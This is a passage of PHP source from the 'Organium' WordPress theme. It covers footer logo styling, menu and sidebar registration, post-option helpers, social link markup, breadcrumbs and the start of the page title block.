        font-size: ' . esc_attr($footer_socials_font_size) . ';
    }
    ';
}

if (organium_get_post_option('footer_customize_logo') == 'yes' && !empty(organium_get_post_option('footer_logo_image'))) {
//                $footer_logo_metadata = organium_get_post_option('footer_logo_image');
    $footer_logo_metadata = rwmb_meta( 'footer_logo_image', array( 'size' => 'full' ) );
    $footer_logo_width = (isset($footer_logo_metadata['width']) ? intval($footer_logo_metadata['width']) : 0);
    $footer_logo_height = (isset($footer_logo_metadata['height']) ? intval($footer_logo_metadata['height']) : 0);
    $out .= '
    .organium_footer-logo__link {' .
    (!empty($footer_logo_width) ? 'width: ' . absint($footer_logo_width) . 'px;' : '') .
    (!empty($footer_logo_height) ? 'height: ' . absint($footer_logo_height) . 'px;' : '') .
    'background: url("' . esc_url($footer_logo_metadata['url']) . '") 0 0 no-repeat transparent;
    background-size: cover;
}
';
}
if (organium_get_post_option('footer_customize_logo') == 'yes' && organium_get_post_option('footer_logo_retina') == 1) {
    if ( !empty(organium_get_post_option('footer_logo_image') ) ) {
//                    $footer_logo_metadata = organium_get_post_option('footer_logo_image');
        $footer_logo_metadata = rwmb_meta( 'footer_logo_image', array( 'size' => 'full' ) );
        $footer_logo_width = (isset($footer_logo_metadata['width']) ? intval($footer_logo_metadata['width']) : '');
        $footer_logo_height = (isset($footer_logo_metadata['height']) ? intval($footer_logo_metadata['height']) : '');
    } else {
        $footer_logo_metadata = wp_get_attachment_metadata(attachment_url_to_postid(organium_get_theme_mod('footer_logo_image')));
        $footer_logo_width = (isset($footer_logo_metadata['width']) ? $footer_logo_metadata['width'] : '');
        $footer_logo_height = (isset($footer_logo_metadata['height']) ? $footer_logo_metadata['height'] : '');
    }
    $footer_logo_width_retina = floor($footer_logo_width / 2);
    $footer_logo_height_retina = floor($footer_logo_height / 2);

    $out .= '
    .organium_footer-logo__link.organium_retina_logo {' .
    (!empty($footer_logo_width_retina) ? 'width: ' . absint($footer_logo_width_retina) . 'px;' : '') .
    (!empty($footer_logo_height_retina) ? 'height: ' . absint($footer_logo_height_retina) . 'px;' : '') .
    'background-size: cover;
}
';
}

if ( !empty($out) ) {
    wp_add_inline_style('organium-theme', $out);
}
}
}
}

# Register CSS/JS for Admin Settings
add_action('admin_enqueue_scripts', 'organium_admin_css_js');
if (!function_exists('organium_admin_css_js')) {
    function organium_admin_css_js()
    {
        # CSS
        wp_enqueue_style('organium-admin', get_template_directory_uri() . '/css/admin.css');
        # JS
        wp_enqueue_script('organium-admin', get_template_directory_uri() . '/js/admin.js', array('jquery', 'jquery-ui-core', 'jquery-ui-sortable'), false, true);
    }
}



# WP Footer
add_action('wp_footer', 'organium_wp_footer');
if (!function_exists('organium_wp_footer')) {
    function organium_wp_footer()
    {
        Organium_Helper::getInstance()->echoFooter();
    }
}

# Register Menu
add_action('init', 'organium_register_menu');
if (!function_exists('organium_register_menu')) {
    function organium_register_menu() {
        register_nav_menus(
            array(
                'main' => esc_html__('Main menu', 'organium')
            )
        );

        register_nav_menus(
            array(
                'sidebar_menu' => esc_html__('Side Menu', 'organium')
            )
        );

        register_nav_menus(
            array(
                'footer_additional_menu' => esc_html__('Footer Additional Menu', 'organium')
            )
        );

        register_nav_menus(
            array(
                'footer_menu' => esc_html__('Footer Menu', 'organium')
            )
        );
    }
}


# Register Sidebars
add_action('widgets_init', 'organium_widgets_init');
if (!function_exists('organium_widgets_init')) {
    function organium_widgets_init() {
        register_sidebar(
            array(
                'name' => esc_html__('Page Sidebar', 'organium'),
                'id' => 'sidebar',
                'description' => esc_html__('Widgets in this area will be shown on all pages.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h6 class="widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Blog Sidebar', 'organium'),
                'id' => 'sidebar-blog',
                'description' => esc_html__('Widgets in this area will be shown on all posts and archive pages.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h6 class="widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Portfolio Sidebar', 'organium'),
                'id' => 'sidebar-portfolio',
                'description' => esc_html__('Widgets in this area will be shown on all portfolio pages.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h6 class="widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Recipes Sidebar', 'organium'),
                'id' => 'sidebar-recipes',
                'description' => esc_html__('Widgets in this area will be shown on all recipe pages.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h6 class="widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Side Panel Sidebar', 'organium'),
                'id' => 'sidebar-side',
                'description' => esc_html__('Widgets in this area will be shown on side panel.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget %2$s">',
                'after_widget' => '</div>',
                'before_title' => '<h6 class="widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Footer Sidebar (Style 1)', 'organium'),
                'id' => 'sidebar-footer-style1',
                'description' => esc_html__('Widgets in this area will be shown on footer area.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget footer_widget %2$s"><div class="footer_widget_wrapper">',
                'after_widget' => '</div></div>',
                'before_title' => '<h6 class="organium_footer_widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Footer Sidebar (Style 2)', 'organium'),
                'id' => 'sidebar-footer-style2',
                'description' => esc_html__('Widgets in this area will be shown on footer area.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget footer_widget %2$s"><div class="footer_widget_wrapper">',
                'after_widget' => '</div></div>',
                'before_title' => '<h6 class="organium_footer_widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Footer Sidebar (Style 3)', 'organium'),
                'id' => 'sidebar-footer-style3',
                'description' => esc_html__('Widgets in this area will be shown on footer area.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget footer_widget %2$s"><div class="footer_widget_wrapper">',
                'after_widget' => '</div></div>',
                'before_title' => '<h6 class="organium_footer_widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Footer Sidebar (Style 4)', 'organium'),
                'id' => 'sidebar-footer-style4',
                'description' => esc_html__('Widgets in this area will be shown on footer area.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget footer_widget %2$s"><div class="footer_widget_wrapper">',
                'after_widget' => '</div></div>',
                'before_title' => '<h6 class="organium_footer_widget_title">',
                'after_title' => '</h6>',
            )
        );

        register_sidebar(
            array(
                'name' => esc_html__('Footer Sidebar (Style 5)', 'organium'),
                'id' => 'sidebar-footer-style5',
                'description' => esc_html__('Widgets in this area will be shown on footer area.', 'organium'),
                'before_widget' => '<div id="%1$s" class="widget footer_widget %2$s"><div class="footer_widget_wrapper">',
                'after_widget' => '</div></div>',
                'before_title' => '<h6 class="organium_footer_widget_title">',
                'after_title' => '</h6>',
            )
        );

        if (class_exists('WooCommerce')) {
            register_sidebar(
                array(
                    'name' => esc_html__('Sidebar WooCommerce', 'organium'),
                    'id' => 'sidebar-woocommerce',
                    'description' => esc_html__('Widgets in this area will be shown on Woocommerce Pages.', 'organium'),
                    'before_widget' => '<div id="%1$s" class="widget woo&#1057;&#1027;ommerce_widget %2$s">',
                    'after_widget' => '</div>',
                    'before_title' => '<h6 class="widget_title">',
                    'after_title' => '</h6>',
                )
            );
        }
    }
}

# RWMB check
if (!function_exists('organium_post_options')) {
    function organium_post_options()
    {
        if (class_exists('RWMB_Loader')) {
            return true;
        } else {
            return false;
        }
    }
}

# RWMB get option
if (!function_exists('organium_get_post_option')) {
    function organium_get_post_option($name, $default = false) {
        if (class_exists('RWMB_Loader')) {
            if (rwmb_meta($name)) {
                return rwmb_meta($name);
            } else {
                return $default;
            }
        } else {
            return $default;
        }
    }
}

# RWMB get value
if (!function_exists('organium_get_post_value')) {
    function organium_get_post_value($name, $default = false) {
        if (class_exists('RWMB_Loader')) {
            if (rwmb_the_value($name, null, null, false)) {
                return rwmb_the_value($name, null, null, false);
            } else {
                return $default;
            }
        } else {
            return $default;
        }
    }
}

# RWMB get image
if (!function_exists('organium_get_post_image')) {
    function organium_get_post_image($name, $size = 'large', $default = false) {
        if (class_exists('RWMB_Loader')) {
            if (rwmb_meta($name)) {
                $out = '';
                $images = rwmb_meta( $name, array( 'size' => $size ) );
                foreach ( $images as $image ) {
                    $out .= '<div class="image_wrapper"><img src="'. $image['url']. '" alt="'. $image['alt']. '"></div>';
                }
                return $out;
            } else {
                return $default;
            }
        } else {
            return $default;
        }
    }
}

# RWMB get time
if (!function_exists('organium_get_post_time')) {
    function organium_get_post_time($time, $default = false) {
        if (class_exists('RWMB_Loader')) {
            if (rwmb_meta($time)) {
                $time = ' ' . rwmb_meta($time);
                $time = str_replace(esc_html__(' 0 Hours', 'organium'), '', $time);
                $time = str_replace(esc_html__(' 0 Minutes', 'organium'), '', $time);
                $time = str_replace(esc_html__(' 1 Hours', 'organium'), esc_html__(' 1 Hour', 'organium'), $time);
                $time = str_replace(esc_html__(' 1 Minutes', 'organium'), esc_html__('1 Minute', 'organium'), $time);
                return trim($time);
            } else {
                return $default;
            }
        } else {
            return $default;
        }
    }
}

# Get Portfolio Post Categories in Post Navigation
function organium_get_portfolio_nav_categories( $pid = '' ){
    $pid = empty($pid) ? get_the_id() : $pid;
    $terms_arr = wp_get_post_terms( $pid, 'portfolio-category' );
    $terms = "";
    if ( is_wp_error( $terms_arr ) ){
        return $terms;
    }
    for( $i = 0; $i < count( $terms_arr ); $i++ ){
        $term_obj	= $terms_arr[$i];
        $term_slug	= $term_obj->slug;
        $term_name	= esc_html( $term_obj->name );
        $term_link	= esc_url( get_term_link( $term_slug, 'portfolio-category' ) );
        $terms		.= "<a href='$term_link'>$term_name</a>" . ( $i < ( count( $terms_arr ) - 1 ) ? ", " : "" );
    }
    return $terms;
}

# Get Preffered Option
if (!function_exists('organium_get_prefered_option')) {
    function organium_get_prefered_option($name) {
        if (func_num_args() > 1) {
            die (sprintf(esc_html__('The organium_get_prefered_option ("%s") function may takes only one argument.', 'organium'), $name));
        }

        global $organium_customizer_default_values;

        if (!isset($organium_customizer_default_values[$name])) {
            die (sprintf(esc_html__('Error! You did not add the default value for the "%s" option! core/customizer.php.', 'organium'), $name));
        }

        if (organium_get_post_option($name) && organium_get_post_option($name) !== 'default') {
            return organium_get_post_option($name, $organium_customizer_default_values[$name]);
        } else {
            return organium_get_theme_mod($name);
        }
    }
}

# Get Featured Image Url
if (!function_exists('organium_get_featured_image_url')) {
    function organium_get_featured_image_url() {
        $featured_image_full_url = wp_get_attachment_image_src(get_post_thumbnail_id(), 'full');
        if (isset($featured_image_full_url[0]) && strlen($featured_image_full_url[0]) > 0) {
            return esc_url($featured_image_full_url[0]);
        } else {
            return false;
        }
    }
}

if (!function_exists('organium_get_attachment_meta')) {
    function organium_get_attachment_meta($attachment_id) {
        $attachment = get_post($attachment_id);
        return array(
            'alt' => get_post_meta($attachment->ID, '_wp_attachment_image_alt', true),
            'caption' => $attachment->post_excerpt,
            'description' => $attachment->post_content,
            'href' => get_permalink($attachment->ID),
            'src' => $attachment->guid,
            'title' => $attachment->post_title
        );
    }
}

# PRE
if (!function_exists('organium_pre')) {
    function organium_pre($array) {
        echo '<pre>';
        print_r($array);
        echo '</pre>';
    }
}

# Admin Footer
add_filter('admin_footer', 'organium_admin_footer');
if (!function_exists('organium_admin_footer')) {
    function organium_admin_footer() {
        if (strlen(get_page_template_slug())>0) {
            echo "<input type='hidden' name='' value='" . (get_page_template_slug() ? get_page_template_slug() : '') . "' class='organium_this_template_file'>";
        }
    }
}

if (!function_exists('organium_remove_post_format_parameter')) {
    function organium_remove_post_format_parameter($url) {
        $url = remove_query_arg('post_format', $url);
        return $url;
    }
    add_filter('preview_post_link', 'organium_remove_post_format_parameter', 9999);
}

if (!function_exists('organium_objectToArray')) {
    function organium_objectToArray ($object) {
        if(!is_object($object) && !is_array($object))
            return $object;

        return array_map('organium_objectToArray', (array) $object);
    }
}

# Social Links Output
if (!function_exists('organium_socials_output')) {
    function organium_socials_output($container_class = '') {

        $socials_output = '<ul' . (!empty($container_class) ? ' class="' . esc_attr($container_class) . '">' : '>');

        if (organium_get_theme_mod('socials_target')) {
            $socials_target = '_blank';
        } else {
            $socials_target = '_self';
        }

        # Facebook
        if (organium_get_theme_mod('socials_facebook') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_facebook')) . '" target="' . esc_attr($socials_target) . '" class="icon-facebook"></a>
            </li>
            ';
        }

        # Twitter
        if (organium_get_theme_mod('socials_twitter') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_twitter')) . '" target="' . esc_attr($socials_target) . '" class="icon-twitter"></a>
            </li>
            ';
        }

        # LinkedIn
        if (organium_get_theme_mod('socials_linkedin') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_linkedin')) . '" target="' . esc_attr($socials_target) . '" class="icon-linkedin"></a>
            </li>
            ';
        }

        # YouTube
        if (organium_get_theme_mod('socials_youtube') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_youtube')) . '" target="' . esc_attr($socials_target) . '" class="icon-youtube"></a>
            </li>
            ';
        }

        # Instagram
        if (organium_get_theme_mod('socials_instagram') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_instagram')) . '" target="' . esc_attr($socials_target) . '" class="icon-instagram"></a>
            </li>
            ';
        }

        # Pinterest
        if (organium_get_theme_mod('socials_pinterest') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_pinterest')) . '" target="' . esc_attr($socials_target) . '" class="icon-pinterest"></a>
            </li>
            ';
        }

        # Tumblr
        if (organium_get_theme_mod('socials_tumbl') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_tumbl')) . '" target="' . esc_attr($socials_target) . '" class="icon-tumblr"></a>
            </li>
            ';
        }

        # Flickr
        if (organium_get_theme_mod('socials_flickr') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_flickr')) . '" target="' . esc_attr($socials_target) . '" class="icon-flickr"></a>
            </li>
            ';
        }

        # VK
        if (organium_get_theme_mod('socials_vk') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_vk')) . '" target="' . esc_attr($socials_target) . '" class="icon-vk"></a>
            </li>
            ';
        }

        # Dribbble
        if (organium_get_theme_mod('socials_dribbble') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_dribbble')) . '" target="' . esc_attr($socials_target) . '" class="icon-dribbble"></a>
            </li>
            ';
        }

        # Vimeo
        if (organium_get_theme_mod('socials_vimeo') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_vimeo')) . '" target="' . esc_attr($socials_target) . '" class="icon-vimeo"></a>
            </li>
            ';
        }

        # 500px
        if (organium_get_theme_mod('socials_500px') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_500px')) . '" target="' . esc_attr($socials_target) . '" class="icon-500px"></a>
            </li>
            ';
        }

        # XING
        if (organium_get_theme_mod('socials_xing') !== '') {
            $socials_output .= '
            <li>
            <a href="' . esc_url(organium_get_theme_mod('socials_xing')) . '" target="' . esc_attr($socials_target) . '" class="icon-xing"></a>
            </li>
            ';
        }

        $socials_output .= '</ul>';

        return $socials_output;
    }
}

// Init Custom Widgets
if (function_exists('organium_add_custom_widget')) {
    organium_add_custom_widget('organium_socials_widget');
    organium_add_custom_widget('organium_address_widget');
    organium_add_custom_widget('organium_featured_posts_widget');
    organium_add_custom_widget('organium_recent_recipes_widget');
    organium_add_custom_widget('organium_recipes_categories_widget');
    organium_add_custom_widget('organium_banner_widget');
}

// Output Code
if (!function_exists('organium_output_code')) {
    function organium_output_code($code) {
        return $code;
    }
}

// Breadcrumbs
if ( ! function_exists( 'organium_breadcrumbs' ) ) {
    function organium_breadcrumbs(){
        /* === OPTIONS === */
        $text['home']	    = esc_html__( 'Home', 'organium' ); // text for the 'Home' link
        $text['category']   = esc_html__( 'Archive by Category "%s"', 'organium' ); // text for a category page
        $text['search']     = esc_html__( 'Search for "%s"', 'organium' ); // text for a search results page
        $text['taxonomy']   = esc_html__( 'Archive by %s "%s"', 'organium' );
        $text['tag']	    = esc_html__( 'Posts Tagged "%s"', 'organium' ); // text for a tag page
        $text['author']     = esc_html__( 'Articles Posted by %s', 'organium' ); // text for an author page
        $text['404']	    = esc_html__( '404 Page', 'organium' ); // text for the 404 page

        $show_current       = 1; // 1 - show current post/page/category title in breadcrumbs, 0 - don't show
        $show_on_home       = 0; // 1 - show breadcrumbs on the homepage, 0 - don't show
        $show_on_404   	    = 0; // 1 - show breadcrumbs on the 404, 0 - don't show
        $show_home_link     = 1; // 1 - show the 'Home' link, 0 - don't show
        $delimiter	        = "<span class='delimiter'></span>";
        $before		        = '<span class="current">'; // tag before the current crumb
        $after		        = '</span>'; // tag after the current crumb
        /* === END OF OPTIONS === */

        global $post;
        $home_link = esc_url( home_url( '/' ) );
        $link = '<a href="%1$s">%2$s</a>';
        $parent_id = '';
        if ( isset( $post->post_parent ) ) {
            $parent_id	= $parent_id_2 = $post->post_parent;
        }

        $frontpage_id = get_option( 'page_on_front' );

        if ( !$show_on_404 && is_404() ) {
            return;
        }

        if ( is_home() || is_front_page() ) {
            if ( $show_on_home == 1 ) {
                echo '<nav class="breadcrumbs"><a href="' . $home_link . '">' . $text['home'] . '</a></nav>';
            }
        } else if ( class_exists('WooCommerce') && is_woocommerce() ) {
            woocommerce_breadcrumb(array(
                'delimiter' => $delimiter,
                'wrap_before' => '<nav class="breadcrumbs">',
                'wrap_after' => '</nav>'
            ));
        } else {
            echo '<nav class="breadcrumbs">';
            if ( $show_home_link == 1 ) {
                echo '<a href="' . $home_link . '">' . $text['home'] . '</a>';
                if ( $frontpage_id == 0 || $parent_id != $frontpage_id ) { echo sprintf("%s", $delimiter ); }
            }

            if ( is_category() ) {
                $cat = get_category( get_query_var( 'cat' ) );
                $cat_name = isset( $cat->name ) ? $cat->name : '';
                $parent_cats = array();
                $has_parent_cat = false;
                $temp_cat = $cat;
                while ( true ) {
                    if ( isset( $temp_cat->parent ) && $temp_cat->parent ) {
                        array_push( $parent_cats, $temp_cat->parent );
                        $temp_cat = get_category( $temp_cat->parent );
                    } else {
                        break;
                    }
                }
                $parent_cats = array_reverse( $parent_cats );
                for ( $i = 0; $i < count( $parent_cats ); $i++ ) {
                    $cur_cat_obj = get_category( $parent_cats[ $i ] );
                    $cur_cat_name = isset( $cur_cat_obj->name ) ? $cur_cat_obj->name : '';
                    if ( ! empty( $cur_cat_name ) && isset( $cur_cat_obj->term_id ) ) {
                        $cur_cat_link = get_category_link( $cur_cat_obj->term_id );
                        if($has_parent_cat){
                            echo sprintf("%s", $delimiter);
                        }
                        printf( $link, $cur_cat_link, $cur_cat_name );
                        $has_parent_cat = true;
                    }
                }
                if ( $show_current == 1 ) {
                    if($has_parent_cat){
                        echo sprintf("%s", $delimiter);
                    }
                    echo sprintf("%s", $before) . sprintf( $text['category'], $cat_name );
                }
            } elseif ( is_tag() ) {
                echo sprintf("%s", $before) . sprintf( $text['tag'], single_tag_title( '', false ) ) . sprintf( "%s", $after );
            } elseif ( is_author() ) {
                global $author;
                $userdata = get_userdata( $author );
                echo sprintf("%s", $before) . esc_html( sprintf( $text['author'], $userdata->display_name ) ) . sprintf( "%s", $after );

            } elseif ( is_day() ) {
                echo sprintf( $link, get_year_link( get_the_time( 'Y' ) ), get_the_time( 'Y' ) ) . sprintf("%s", $delimiter);
                echo sprintf( $link, get_month_link( get_the_time( 'Y' ),get_the_time( 'm' ) ), get_the_time( 'F' ) ) . sprintf("%s", $delimiter);
                echo sprintf("%s", $before) . get_the_time( 'd' ) . sprintf( "%s", $after );

            } elseif ( is_month() ) {
                echo sprintf( $link, get_year_link( get_the_time( 'Y' ) ), get_the_time( 'Y' ) ) . sprintf("%s", $delimiter);
                echo sprintf("%s", $before) . get_the_time( 'F' ) . sprintf( "%s", $after );

            } elseif ( is_year() ) {
                echo sprintf("%s", $before) . get_the_time( 'Y' ) . sprintf( "%s", $after );

            } elseif ( has_post_format() && ! is_singular() ) {
                echo get_post_format_string( get_post_format() );
            } else if ( is_tax( array( 'organium-portfolio', 'portfolio-category', 'organium-recipes', 'recipes-category' ) ) ) {
                $tax_slug = get_query_var( 'taxonomy' );
                $term_slug = get_query_var( $tax_slug );
                $tax_obj = get_taxonomy( $tax_slug );
                $term_obj = get_term_by( 'slug', $term_slug, $tax_slug );
                $parent_terms = array();
                $has_parent_term = false;
                if ( isset( $tax_obj->hierarchical ) && $tax_obj->hierarchical ) {
                    $temp_term_obj = $term_obj;
                    while ( true ) {
                        if ( isset( $temp_term_obj->parent ) && $temp_term_obj->parent ) {
                            array_push( $parent_terms, $temp_term_obj->parent );
                            $temp_term_obj = get_term_by( 'id', $temp_term_obj->parent, $tax_slug );
                        } else {
                            break;
                        }
                    }
                    $parent_terms = array_reverse( $parent_terms );
                    for ( $i = 0; $i < count( $parent_terms ); $i++ ) {
                        $cur_term = get_term_by( 'id', $parent_terms[ $i ], $tax_slug );
                        $cur_term_name = isset( $cur_term->name ) ? $cur_term->name : '';
                        if ( ! empty( $cur_term_name ) && isset( $cur_term->term_id ) ) {
                            $cur_term_link = get_term_link( $cur_term->term_id, $tax_slug );
                            if($has_parent_term){
                                echo sprintf("%s", $delimiter);
                            }
                            printf( $link, $cur_term_link, $cur_term_name );
                            $has_parent_term = true;
                        }
                    }
                }
                if ( $show_current == 1 ) {
                    $singular_tax_label = isset( $tax_obj->labels ) && isset( $tax_obj->labels->singular_name ) ? $tax_obj->labels->singular_name : '';
                    $term_name = isset( $term_obj->name ) ? $term_obj->name : '';
                    if($has_parent_term){
                        echo sprintf("%s", $delimiter);
                    }
                    echo sprintf("%s", $before) . esc_html( sprintf( $text['taxonomy'], $singular_tax_label, $term_name ) );
                }
            } elseif ( is_archive() ) {
                if ( $show_current ) {
                    $post_type = get_post_type();
                    $post_type_obj = get_post_type_object( $post_type );

                    if( $post_type == 'organium-portfolio' || $post_type == 'organium-recipes' ){
                        $post_type_name = get_theme_mod($post_type.'_slug');
                    }

                    if( empty($post_type_name) ){
                        $post_type_name = isset( $post_type_obj->label ) ? $post_type_obj->label : '';
                    }

                    echo sprintf("%s", $before) . esc_html($post_type_name) . sprintf( "%s", $after );
                }
            } elseif ( is_search() ) {
                echo sprintf("%s", $before) . sprintf( $text['search'], get_search_query() ) . sprintf( "%s", $after );
            } elseif ( is_single() ) {
                $post_type = get_post_type();
                $post_type_obj = get_post_type_object( $post_type );

                if( $post_type == 'organium-portfolio' || $post_type == 'organium-recipes' ){
                    $post_type_label = get_theme_mod($post_type.'_slug');
                }

                if( empty($post_type_label) ){
                    $post_type_label = isset( $post_type_obj->label ) ? $post_type_obj->label : '';
                }

                $post_type_link = get_post_type_archive_link( $post_type );
                if ( $post_type_obj->has_archive ) {
                    printf( $link, $post_type_link, $post_type_label  );
                    echo sprintf("%s", $delimiter);
                }

                if ( $show_current ) {
                    if ( empty(get_the_title()) ) {
                        echo sprintf("%s", $before) . esc_html__('(no title)', 'organium') . sprintf("%s", $after);
                    } else {
                        echo sprintf("%s", $before) . wp_kses( get_the_title(), array(
                            "b"			=> array(),
                            "em"		=> array(),
                            "sup"		=> array(),
                            "sub"		=> array(),
                            "strong"	=> array(),
                            "mark"		=> array(),
                            "br"		=> array()
                        )) . sprintf("%s", $after);
                    }
                }
            } elseif ( is_page() && ! $parent_id ) {
                if ( empty(get_the_title()) ) {
                    echo sprintf("%s", $before) . esc_html__('(no title)', 'organium') . sprintf("%s", $after);
                } else {
                    echo sprintf("%s", $before) . wp_kses( get_the_title(), array(
                        "b"			=> array(),
                        "em"		=> array(),
                        "sup"		=> array(),
                        "sub"		=> array(),
                        "strong"	=> array(),
                        "mark"		=> array(),
                        "br"		=> array()
                    )) . sprintf("%s", $after);
                }
            } elseif ( is_page() && $parent_id ) {
                if ( $parent_id != $frontpage_id ) {
                    $breadcrumbs = array();
                    while ( $parent_id ) {
                        $page = get_page( $parent_id );
                        if ( $parent_id != $frontpage_id ) {
                            $breadcrumbs[] = sprintf( $link, get_permalink( $page->ID ), wp_kses( get_the_title( $page->ID ), array(
                                "b"			=> array(),
                                "em"		=> array(),
                                "sup"		=> array(),
                                "sub"		=> array(),
                                "strong"	=> array(),
                                "mark"		=> array(),
                                "br"		=> array()
                            )) );
                        }
                        $parent_id = $page->post_parent;
                    }
                    $breadcrumbs = array_reverse( $breadcrumbs );
                    for ( $i = 0; $i < count( $breadcrumbs ); $i++ ) {
                        echo sprintf("%s", $breadcrumbs[ $i ]);
                        if ( $i != count( $breadcrumbs ) -1 ) { echo sprintf("%s", $delimiter); }
                    }
                }
                if ( $show_current == 1 ) {
                    if ( $show_home_link == 1 || ($parent_id_2 != 0 && $parent_id_2 != $frontpage_id) ) { echo sprintf("%s", $delimiter); }
                    if ( empty(get_the_title()) ) {
                        echo sprintf("%s", $before) . esc_html__('(no title)', 'organium') . sprintf("%s", $after);
                    } else {
                        echo sprintf("%s", $before) . wp_kses( get_the_title(), array(
                            "b"			=> array(),
                            "em"		=> array(),
                            "sup"		=> array(),
                            "sub"		=> array(),
                            "strong"	=> array(),
                            "mark"		=> array(),
                            "br"		=> array()
                        )) . sprintf("%s", $after);
                    }
                }
            } elseif ( is_404() ) {
                echo sprintf("%s", $before) . esc_html($text['404']) . sprintf( "%s", $after );
            }

            if ( get_query_var( 'paged' ) ) {
                echo sprintf("%s", $delimiter) . esc_html__( 'Page', 'organium' ) . ' ' . get_query_var( 'paged' );
            }
            echo '</nav>';
        }
    }
}

// Page Title Block
if (!function_exists('organium_page_title_block_output')) {
    function organium_page_title_block_output() {
        if (is_home() || is_archive() || is_tag() || is_search()) {
            if (class_exists('WooCommerce')) {
                if (is_woocommerce()) {
                    if (organium_get_post_option('page_title_image_type') == 'alt') {
                        if (organium_get_post_option('page_title_alt_image') !== false) {
                            foreach (organium_get_post_option('page_title_alt_image') as $key => $image) {
                                $data_bg_image = 'data-background="' . $image['full_url'] . '"';
                            }
                            $organium_js_bg_image_class = 'organium_js_bg_image';
                        } else {
                            if (organium_get_featured_image_url()) {
                                $organium_js_bg_image_class = 'organium_js_bg_image';
                                $data_bg_image = 'data-background="' . organium_get_featured_image_url() . '"';
                            } else {
                                $organium_js_bg_image_class = '';
                                $data_bg_image = '';
                            }
                        }
                    } else {
                        if (organium_get_featured_image_url()) {
                            $organium_js_bg_image_class = 'organium_js_bg_image';
                            $data_bg_image = 'data-background="' . organium_get_featured_image_url() . '"';
                        } else {
                            $organium_js_bg_image_class = '';
                            $data_bg_image = '';
                        }
                    }
                } else {
                    $organium_js_bg_image_class = '';
                    $data_bg_image = '';
                }
            } else {
                $organium_js_bg_image_class = '';
                $data_bg_image = '';
            }
        } else {
            if (organium_get_post_option('page_title_image_type') == 'alt') {
                if (organium_get_post_option('page_title_alt_image') !== false) {
                    foreach (organium_get_post_option('page_title_alt_image') as $key => $image) {
                        $data_bg_image = 'data-background="' . $image['full_url'] . '"';
                    }
                } else {
                    if (organium_get_featured_image_url()) {
                        $data_bg_image = 'data-background="' . organium_get_featured_image_url() . '"';
                    } else {
                        $data_bg_image = '';
                    }
                }
            } else {
                if (organium_get_featured_image_url()) {
                    $data_bg_image = 'data-background="' . organium_get_featured_image_url() . '"';
                } else {
                    $data_bg_image = '';
                }
            }
        }





        $organium_title_block = '
        <div class="organium_page_title_container" ' . esc_attr($data_bg_image) . '>
        <div class="organium_page_title_bg"></div>
        <div class="container">
        <div class="organium_page_title_wrapper">';
        if (is_home()) {
            $page_title = esc_html__('Home', 'organium');
        } elseif (
            class_exists('WooCommerce') && (
                ( is_woocommerce() || is_cart() || is_checkout() || is_account_page() ) ||
                ( function_exists('yith_wishlist_constructor') && yith_wcwl_is_wishlist_page() )
            )
        ) {
            $page_title = esc_html__('Shop', 'organium');
        } elseif (is_archive()) {
            if (is_tag()) {
                $page_title = sprintf(esc_html__('Archive by Tag %s', 'organium'), single_tag_title('', false));
            } elseif (is_woocommerce()) {
                if (organium_get_post_option('title_type') == 'alt') {
                    $page_title = organium_get_post_option('alt_title');
                } else {
                    $page_title = get_the_title();
                }
            } elseif ( !empty(get_queried_object()) && get_queried_object()->name == 'organium-recipes') {
                $page_title = esc_html__('Recipes', 'organium');
            } elseif ( !empty(get_queried_object()) && get_queried_object()->name == 'organium-portfolio') {
                $page_title = esc_html__('Our Gallery', 'organium');
            } else {
                $page_title = esc_html__('Archive', 'organium');
            }
        } elseif (is_search()) {
            $page_title = sprintf(esc_html__('Search Results By "%s"', 'organium'), get_search_query());
        } elseif (is_singular('organium-recipes')) {
            $page_title = esc_html__('Recipes', 'organium');
        } elseif (is_singular('organium-portfolio')) {
            $page_title = esc_html__('Our Gallery', 'organium');
        } elseif (is_single()) {
            $page_title = esc_html__('Blog', 'organium');
        } else {
            if (organium_get_post_option('title_type') == 'alt') {
                $page_title = organium_get_post_option('alt_title');
            } else {
                $page_title = get_the_title();
            }
        }

        $organium_title_block .= '
